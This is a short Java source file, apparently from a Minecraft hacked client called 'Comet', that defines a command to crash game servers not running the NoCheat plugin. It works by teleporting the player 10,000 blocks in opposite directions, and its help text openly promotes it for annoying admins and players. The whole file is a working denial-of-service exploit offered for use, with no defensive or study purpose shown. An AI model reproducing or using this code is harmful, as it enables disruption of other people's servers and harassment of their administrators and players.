package Comet.Commands;

import Comet.Mods.*;

public class c_CrashTp extends Base_Command {

	public void run(String as[]) throws Exception { 
		crashExploit();
	}

	public String getHelp() throws Exception {return "Crashes a NON NoCheat server..";}

	public String getUsage() throws Exception {return ", can be used to annoy admins and players.";}
	
    public void crashExploit() {
        double x = mc.thePlayer.posX;
        double y = mc.thePlayer.posZ;
        mc.comet.teleport.TeleportTo(x + 10000D, 128D, y + 10000D);
        mc.comet.teleport.TeleportTo(x - 10000D, 128D, y - 10000D);
        mc.comet.utils.addChat("Server crashed.");
    }

}
